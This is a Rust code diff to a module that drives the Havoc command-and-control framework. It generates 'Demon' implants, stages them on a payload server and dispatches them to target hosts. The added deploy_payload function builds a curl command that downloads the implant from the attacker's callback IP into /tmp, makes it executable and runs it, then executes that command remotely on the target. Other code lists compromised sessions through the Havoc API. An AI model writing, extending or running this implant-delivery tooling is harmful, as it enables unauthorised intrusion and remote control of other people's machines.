@@ -11,21 +11,28 @@ use std::sync::Arc;
 
 pub struct HavocScanner {
     binary_path: String,
-    proxy_manager: Arc<crate::utils::proxy::ProxyManager>,
+    executor: Arc<crate::utils::executor::StealthExecutor>,
 }
 
 impl HavocScanner {
-    pub fn new(pm: Arc<crate::utils::proxy::ProxyManager>) -> Self {
+    pub fn new(executor: Arc<crate::utils::executor::StealthExecutor>) -> Self {
         let path = detect_tool("havoc");
         Self {
             binary_path: path,
-            proxy_manager: pm,
+            executor,
         }
     }
 
     async fn get_rest_client(&self) -> Result<reqwest::Client> {
-        let server_addr = "127.0.0.1"; // Default havoc server
-        let (_, client) = self.proxy_manager.get_client_fail_closed(server_addr)?;
+        let server_addr = std::env::var("HAVOC_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());
+        let pm = self.executor.get_proxy_manager()
+            .context("Havoc requires a ProxyManager for REST API access")?;
+            
+        let (_, client) = if server_addr == "127.0.0.1" || server_addr == "localhost" {
+            pm.get_localhost_client(&server_addr)?
+        } else {
+            pm.get_client_fail_closed(&server_addr)?
+        };
         Ok(client)
     }
 }
@@ -33,7 +40,9 @@ impl HavocScanner {
 #[async_trait]
 impl C2Operator for HavocScanner {
     async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
-        let callback_ip = self.proxy_manager.get_managed_exits().first().cloned()
+        let pm = self.executor.get_proxy_manager()
+            .context("Havoc requires a ProxyManager for callback tracking")?;
+        let callback_ip = pm.get_managed_exits().first().cloned()
             .unwrap_or_else(|| "127.0.0.1".to_string());
             
         info!("🔱 V14.1 SOVEREIGN: Generating Havoc Demon for {} via callback {}", target.host, callback_ip);
@@ -62,13 +71,33 @@ impl C2Operator for HavocScanner {
     }
 
     async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
-        info!("🔱 V14.1 SOVEREIGN: Deploying Havoc Demon {} to {}...", payload_path, target.host);
+        info!("🔱 V14.1 SOVEREIGN: Initializing Professional OTT Delivery for Havoc Demon on {}...", target.host);
         
+        let pm = self.executor.get_proxy_manager().context("ProxyManager required for delivery")?;
+        
+        // 1. Stage payload on OTT server
+        let server = Arc::new(crate::utils::payload_server::PayloadServer::new());
+        let token = server.stage_payload(std::path::PathBuf::from(payload_path));
+        let server_port = server.clone().start().await?;
+        
+        // 2. Determine delivery IP
+        let delivery_ip = pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
+        
+        let implant_name = std::path::Path::new(payload_path)
+            .file_name().and_then(|n| n.to_str()).unwrap_or("demon");
+
+        // 3. Construct the delivery vector
         let delivery_cmd = format!(
-            "curl http://127.0.0.1:8080/{} -o /tmp/demon && chmod +x /tmp/demon && /tmp/demon &",
-            std::path::Path::new(payload_path).file_name().and_then(|n| n.to_str()).unwrap_or("demon")
+            "curl -sSL http://{}:{}/{} -o /tmp/{} && chmod +x /tmp/{} && /tmp/{} &",
+            delivery_ip, server_port, token, implant_name, implant_name, implant_name
         );
-        info!("🚀 V14.1 SOVEREIGN: Havoc Delivery Vector → {}", delivery_cmd);
+
+        info!("🚀 V14.1 SOVEREIGN: Dispatching Havoc OTT delivery to remote target...");
+        
+        // 4. Remote dispatch
+        let output = self.executor.execute_remote(target, &delivery_cmd).await?;
+        info!("✅ V14.1 SOVEREIGN: Havoc delivery dispatched. Output: {}", output);
+
         Ok(())
     }
 
@@ -85,7 +114,8 @@ impl C2Operator for HavocScanner {
     async fn list_sessions(&self) -> Result<Vec<C2Session>> {
         let client = self.get_rest_client().await?;
         
-        let response = client.get("http://127.0.0.1:8080/api/sessions")
+        let server_url = std::env::var("HAVOC_API_URL").unwrap_or_else(|_| "http://127.0.0.1:8080".to_string());
+        let response = client.get(format!("{}/api/sessions", server_url))
             .send()
             .await;
 
@@ -96,7 +126,7 @@ impl C2Operator for HavocScanner {
                 if let Some(sess_list) = json.as_array() {
                     for s in sess_list {
                         sessions.push(C2Session {
-                            id: s.get("ExternalIP").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                            id: s.get("AgentID").or_else(|| s.get("ID")).and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                             target: s.get("ExternalIP").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                             state: SessionState::Established,
                             last_checkin: chrono::Utc::now(),
@@ -106,21 +136,19 @@ impl C2Operator for HavocScanner {
                 Ok(sessions)
             }
             _ => {
-                let mut sess_cmd = Command::new(&self.binary_path);
-                sess_cmd.arg("sessions")
-                    .stdin(Stdio::null())
-                    .stdout(Stdio::piped())
-                    .output()
-                    .await
-                    .map(|output| {
-                        let stdout = String::from_utf8_lossy(&output.stdout);
-                        stdout.lines().map(|l| C2Session {
-                            id: "cli".to_string(),
-                            target: l.to_string(),
-                            state: SessionState::Established,
-                            last_checkin: chrono::Utc::now(),
-                        }).collect()
-                    }).context("CLI session audit failed")
+                warn!("⚠️ V14.1 SOVEREIGN: Havoc REST API unreachable. Falling back to CLI.");
+                let output = self.executor.execute_and_wait(&self.binary_path, vec!["sessions".to_string()]).await?;
+                let mut sessions = Vec::new();
+                let stdout = String::from_utf8_lossy(&output.stdout);
+                for l in stdout.lines() {
+                    sessions.push(C2Session {
+                        id: "cli".to_string(),
+                        target: l.to_string(),
+                        state: SessionState::Established,
+                        last_checkin: chrono::Utc::now(),
+                    });
+                }
+                Ok(sessions)
             }
         }
     }
